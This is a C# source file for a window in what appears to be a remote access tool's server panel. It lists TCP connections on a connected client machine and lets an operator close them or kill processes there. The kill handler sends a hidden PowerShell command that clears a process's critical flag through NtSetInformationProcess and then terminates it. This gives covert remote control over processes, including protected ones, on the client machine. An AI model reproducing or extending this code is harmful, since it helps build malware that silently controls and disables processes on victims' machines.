using System.Collections.ObjectModel;
using System.Windows;
using System.Windows.Input;
using Newtonsoft.Json;
using SeroServer.Net;
using SeroServer.Protocol;

namespace SeroServer.UI;

public partial class TcpManagerWindow : Window
{
    private readonly TlsServer _server;
    private readonly string    _clientId;
    private readonly ObservableCollection<TcpEntryVM> _entries = [];

    public TcpManagerWindow(TlsServer server, string clientId, string clientLabel)
    {
        InitializeComponent();
        _server   = server;
        _clientId = clientId;
        TxtTitle.Text  = clientLabel;
        GridTcp.ItemsSource = _entries;

        _server.RegisterHandler(clientId, PacketType.TcpListResult, OnTcpList);

        Closed += (_, _) => _server.UnregisterHandler(clientId, PacketType.TcpListResult);
        Loaded += async (_, _) => await Refresh();
    }

    private async Task Refresh()
    {
        TxtStatus.Text = "Refreshing…";
        await _server.SendToClient(_clientId, new Packet { Type = PacketType.TcpGetList });
    }

    private void OnTcpList(Packet pkt)
    {
        try
        {
            var data = JsonConvert.DeserializeObject<TcpListResultData>(pkt.Data);
            if (data == null) return;
            Dispatcher.Invoke(() =>
            {
                _entries.Clear();
                foreach (var e in data.Entries)
                    _entries.Add(new TcpEntryVM(e.Pid, e.ProcessName, e.LocalAddr, e.RemoteAddr, e.State));
                TxtStatus.Text = $"{_entries.Count} connection(s) — {DateTime.Now:HH:mm:ss}";
            });
        }
        catch { }
    }

    private async void Refresh_Click(object s, RoutedEventArgs e) => await Refresh();

    private async void CloseConn_Click(object s, RoutedEventArgs e)
    {
        if (GridTcp.SelectedItem is not TcpEntryVM row) return;
        var data = JsonConvert.SerializeObject(new TcpCloseData { LocalAddr = row.LocalAddr, RemoteAddr = row.RemoteAddr });
        await _server.SendToClient(_clientId, new Packet { Type = PacketType.TcpClose, Data = data });
        await Task.Delay(300);
        await Refresh();
    }

    private async void KillProc_Click(object s, RoutedEventArgs e)
    {
        if (GridTcp.SelectedItem is not TcpEntryVM row || row.Pid <= 0) return;
        if (MessageBox.Show($"Kill process '{row.ProcessName}' (PID {row.Pid})?",
            "Confirm", MessageBoxButton.YesNo, MessageBoxImage.Warning) != MessageBoxResult.Yes) return;

        // Remove DACL (critical-process flag) then kill
        var cmd = $"powershell -NoP -NonI -W H -Command \"" +
                  $"Add-Type -TypeDefinition @'`n" +
                  $"using System.Runtime.InteropServices;`n" +
                  $"public class PK {{`n" +
                  $"[DllImport(\\\"ntdll.dll\\\")] public static extern int NtSetInformationProcess(System.IntPtr h,int c,ref uint v,int s);`n" +
                  $"[DllImport(\\\"kernel32.dll\\\",SetLastError=true)] public static extern System.IntPtr OpenProcess(uint a,bool i,int p);`n" +
                  $"[DllImport(\\\"kernel32.dll\\\")] public static extern bool TerminateProcess(System.IntPtr h,uint c);`n" +
                  $"[DllImport(\\\"kernel32.dll\\\")] public static extern bool CloseHandle(System.IntPtr h);`n" +
                  $"}}`n" +
                  $"'@ -ErrorAction SilentlyContinue;" +
                  $"$h=[PK]::OpenProcess(0x1FFFFF,$false,{row.Pid});" +
                  $"if($h -ne [IntPtr]::Zero){{$z=[uint32]0;[PK]::NtSetInformationProcess($h,0x1D,[ref]$z,4)|Out-Null;" +
                  $"[PK]::TerminateProcess($h,0)|Out-Null;[PK]::CloseHandle($h)|Out-Null}}\"";

        await _server.SendToClient(_clientId, new Packet { Type = PacketType.AutoTaskShell, Data = cmd });
        TxtStatus.Text = $"Kill sent → PID {row.Pid} ({row.ProcessName})";
        await Task.Delay(600);
        await Refresh();
    }

    private bool _max;
    private void BtnMax_Click(object s, RoutedEventArgs e)
    {
        _max = !_max; WindowState = _max ? WindowState.Maximized : WindowState.Normal;
        BtnMaxTcp.Content = _max ? "❐" : "☐";
    }
    private void Window_MouseLeftButtonDown(object s, MouseButtonEventArgs e)
    {
        if (e.LeftButton == MouseButtonState.Pressed && WindowState != WindowState.Maximized) DragMove();
    }

    private void ResizeGrip_DragDelta(object s, System.Windows.Controls.Primitives.DragDeltaEventArgs e)
    {
        Width  = Math.Max(MinWidth,  Width  + e.HorizontalChange);
        Height = Math.Max(MinHeight, Height + e.VerticalChange);
    }

    private void Close_Click(object s, RoutedEventArgs e) => Close();
}

public record TcpEntryVM(int Pid, string ProcessName, string LocalAddr, string RemoteAddr, string State);
